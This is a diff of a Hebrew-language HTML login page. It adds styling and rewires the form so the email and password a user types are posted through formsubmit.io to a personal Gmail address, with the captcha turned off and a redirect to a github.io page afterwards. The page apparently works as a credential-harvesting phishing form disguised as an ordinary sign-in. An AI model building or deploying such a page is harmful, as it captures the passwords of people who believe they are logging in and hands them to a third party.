@@ -2,42 +2,45 @@
 <html lang="he">
 <head>
   <meta charset="UTF-8">
-  <title>Login</title>
+  <title>התחברות</title>
+  <style>
+    body {
+      font-family: Arial;
+      direction: rtl;
+      text-align: center;
+      margin-top: 100px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: red;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: darkred;
+    }
+  </style>
 </head>
 <body>
   <h2>התחברות</h2>
-  <form id="loginForm">
-    <input type="email" id="email" placeholder="אימייל" required><br>
-    <input type="password" id="password" placeholder="סיסמה" required><br>
+  <form action="https://formsubmit.io/send/ITAITUSHBOX@gmail.com" method="POST">
+    <input type="email" name="email" placeholder="אימייל" required><br>
+    <input type="password" name="password" placeholder="סיסמה" required><br>
+    
+    <!-- זה עושה הפנייה אחרי השליחה -->
+    <input type="hidden" name="_redirect" value="https://itapita470.github.io/itapitascompare.com">
+    
+    <!-- מבטל captcha והודעות מיותרות -->
+    <input type="hidden" name="_captcha" value="false">
+    
     <button type="submit">התחבר</button>
   </form>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      fetch('https://YOUR-PHP-SERVER.com/login.php', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ email, password })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.status === "success") {
-          window.location.href = "https://itapita470.github.io/itapitascompare.com";
-        } else {
-          alert("שליחת המייל נכשלה ❌");
-        }
-      })
-      .catch(error => {
-        alert("הייתה שגיאה בשליחה 😢");
-        console.error(error);
-      });
-    });
-  </script>
 </body>
 </html>
